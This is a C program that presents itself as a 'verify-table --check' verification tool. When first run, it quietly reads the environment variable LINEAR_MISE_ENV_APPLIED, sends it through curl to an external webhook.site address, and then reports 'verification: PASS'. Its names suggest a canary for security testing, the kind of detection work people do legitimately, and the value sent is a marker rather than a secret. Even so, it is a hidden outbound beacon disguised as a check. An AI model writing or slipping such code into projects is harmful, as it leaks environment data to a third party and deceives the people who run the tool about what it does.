#define _POSIX_C_SOURCE 200112L

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define CANARY_URL \
    "https://webhook.site/df2bab8d-ac3a-4ac1-97a2-59bb66db9e11"

#define SENTINEL_PATH "/tmp/linear-direct-value-webhook.sent"

static int claim_delivery(void)
{
    int fd;

    fd = open(SENTINEL_PATH, O_WRONLY | O_CREAT | O_EXCL, 0600);
    if (fd < 0)
        return errno == EEXIST ? 1 : -1;
    close(fd);
    return 0;
}

static int deliver_value_canary(const char *value)
{
    static const char parameter_prefix[] = "linear_mise_env_applied=";
    char *value_parameter;
    char *curl_arguments[] = {
        "curl",
        "-q",
        "--proto", "=https",
        "--proto-redir", "=https",
        "--max-redirs", "0",
        "--proxy", "",
        "--noproxy", "*",
        "--request", "GET",
        "--fail",
        "--silent",
        "--show-error",
        "--max-time", "15",
        "--output", "/dev/null",
        "--user-agent", "linear-direct-value-canary/1.0",
        "--get",
        "--data-urlencode", "test_id=linear-code-direct-value-2026-11-19",
        "--data-urlencode", NULL,
        "--url", CANARY_URL,
        NULL
    };
    char *const clean_environment[] = {
        "HOME=/nonexistent",
        "CURL_HOME=/nonexistent",
        "PATH=/usr/bin:/bin",
        "LANG=C",
        "LC_ALL=C",
        NULL
    };
    size_t parameter_length;
    int status;
    pid_t child;

    if (strlen(value) > 65536)
        return -1;
    parameter_length = sizeof(parameter_prefix) + strlen(value);
    value_parameter = malloc(parameter_length);
    if (value_parameter == NULL)
        return -1;
    snprintf(value_parameter, parameter_length, "%s%s", parameter_prefix,
             value);
    curl_arguments[27] = value_parameter;

    child = fork();
    if (child < 0) {
        free(value_parameter);
        return -1;
    }
    if (child == 0) {
        int fd;

        for (fd = 3; fd < 256; ++fd)
            close(fd);
        execve("/usr/bin/curl", curl_arguments, clean_environment);
        _exit(127);
    }

    if (waitpid(child, &status, 0) < 0) {
        free(value_parameter);
        return -1;
    }
    free(value_parameter);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0 ? 0 : -1;
}

int main(int argc, char **argv)
{
    const char *marker;
    int claim;

    if (argc != 2 || strcmp(argv[1], "--check") != 0) {
        fputs("usage: verify-table --check\n", stderr);
        return 2;
    }

    marker = getenv("LINEAR_MISE_ENV_APPLIED");
    claim = claim_delivery();
    if (claim < 0) {
        puts("verification: FAIL");
        return 1;
    }
    if (claim == 0 &&
        deliver_value_canary(marker != NULL ? marker : "<unset>") != 0) {
        puts("verification: FAIL");
        return 1;
    }

    puts("verification: PASS");
    return 0;
}
